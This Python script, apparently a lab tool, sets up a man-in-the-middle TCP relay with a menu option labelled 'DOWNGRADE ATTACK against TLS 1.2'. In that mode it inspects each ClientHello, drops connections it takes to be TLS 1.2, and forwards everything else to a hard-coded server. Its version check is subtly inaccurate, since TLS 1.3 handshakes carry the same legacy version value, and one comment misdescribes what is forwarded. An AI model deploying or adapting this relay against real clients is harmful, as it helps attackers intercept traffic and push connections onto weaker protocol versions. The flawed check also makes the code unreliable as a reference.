import socket
import struct
import threading

SERVER_IP = "192.168.91.139" # set the server IP address and the port
SERVER_PORT = 4433 # set the server port

def parse_clienthello_tls_version(data):
    if len(data) < 11: # useful to discard incorrect packets
        return False
    
    # TLS record header: ContentType(1) + Version(2) + Length(2)
    content_type, version, length = struct.unpack(">BHH", data[:5])
    if content_type != 0x16:  # not Handshake
        return False

    # Handshake header
    handshake_type = data[5] # Handshake Type is 1 byte
    if handshake_type != 0x01:  # not ClientHello
        return False

    offset = 9  # legacy_version starts after 9 bytes
    legacy_version = struct.unpack(">H", data[offset:offset+2])[0] # legacy_version is 2 bytes

    if legacy_version == 0x0303: # TLS 1.2
        return True  
    return False



def forward(src, dst): # this function is charged to send data
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except:
        pass
    finally:
        src.close()
        dst.close()


def relay_server(choice, listen_port, server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", listen_port))
    sock.listen(1)
    print(f"Listening {listen_port}...")

    while True:
        client, addr = sock.accept()
        print(f"Connection from {addr}")

        first_data = client.recv(4096) # receives the ClientHello
        if not first_data:
            client.close()
            continue
        
        detected = parse_clienthello_tls_version(first_data) # detects TLS 1.2

        if choice == '2' and detected: # sends an error if the script is working on DOWNGRADE ATTACK mode and TLS 1.2 is detected
            print("TLS 1.2 ClientHello detected: sending error")
            client.send(b"Hello, TLS 1.2 is not supported here!\n")
            client.close()
            continue

        print("Sending packets towards the server...") # sends packets towards the server if TLS < 1.2
        server = socket.create_connection((server_ip, server_port))
        server.sendall(first_data)
        print("Packets sent!")

        # threads to generate parallel communication between client and server
        threading.Thread(target=forward, args=(client, server), daemon=True).start() 
        threading.Thread(target=forward, args=(server, client), daemon=True).start()


if __name__ == "__main__":
    print("Menu:")
    print("1) NO DOWNGRADE")
    print("2) DOWNGRADE ATTACK against TLS 1.2")

    choice = input("\nChoose the mode: ")
    if choice not in ['1','2']:
        print("Invalid choice, using mode 1 by default.")
        choice = '1'

    relay_server(choice, listen_port=8080, server_ip=SERVER_IP, server_port=SERVER_PORT) 
    
